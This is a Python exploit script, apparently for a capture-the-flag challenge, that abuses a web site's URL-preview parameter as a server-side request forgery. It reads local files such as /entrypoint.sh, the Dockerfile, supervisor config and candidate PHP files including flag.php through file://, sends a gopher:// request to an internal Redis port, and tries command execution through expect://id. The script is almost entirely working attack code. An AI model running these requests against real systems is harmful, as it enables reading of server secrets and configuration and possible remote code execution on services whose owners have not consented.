import urllib.request
import urllib.parse
import re
import socket

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=8):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode()
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:2000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except socket.timeout:
        return 'TIMEOUT'
    except Exception as e:
        return f'EXCEPTION: {e}'

# 1. Check entrypoint.sh
print("=== /entrypoint.sh ===")
print(fetch('file:///entrypoint.sh'))
print()

# 2. Check startup scripts
print("=== /start.sh ===")
print(fetch('file:///start.sh'))
print()

# 3. Dockerfile or docker-compose
print("=== /Dockerfile ===")
print(fetch('file:///Dockerfile'))
print()

# 4. Supervisor configs
print("=== /etc/supervisord.conf ===")
print(fetch('file:///etc/supervisord.conf'))
print()

# 5. Check if there are other PHP files
print("=== /var/www/html/ listing via file:// ===")
for name in ['config.php', 'admin.php', 'internal.php', 'flag.php', 'debug.php', 'info.php']:
    r = fetch(f'file:///var/www/html/{name}')
    if 'ERROR' not in r:
        print(f'{name}: {r[:200]}')
    else:
        print(f'{name}: not found')

print()

# 6. Check if app uses curl - maybe we can use gopher with shorter timeout
print("=== Gopher to Redis PING (timeout 8s) ===")
print(fetch("gopher://127.0.0.1:6379/_PING%0D%0A", timeout=8))
print()

# 7. Try reading source as base64 via data:// or expect://
print("=== data:// wrapper ===")
print(fetch("data://text/plain;base64,SGVsbG8="))
print()

# 8. Try expect:// for RCE
print("=== expect://id ===")
print(fetch("expect://id"))
print()
